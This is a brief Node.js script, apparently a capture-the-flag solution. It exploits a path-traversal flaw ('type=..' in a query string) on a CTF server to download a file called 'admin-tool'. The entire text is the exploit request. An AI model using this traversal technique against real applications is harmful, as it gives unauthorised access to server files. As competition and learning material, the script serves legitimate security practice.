const axios = require("axios");
const fs = require("fs");

(async () => {
  const response = await axios.get(
    "http://journey.ctf.spamandhex.com/favorites?type=..&favId=bf30a2be2bdf6963"
  );
  fs.writeFileSync("admin-tool", response.data["admin-tool"], {
    encoding: "latin1",
  });
})();
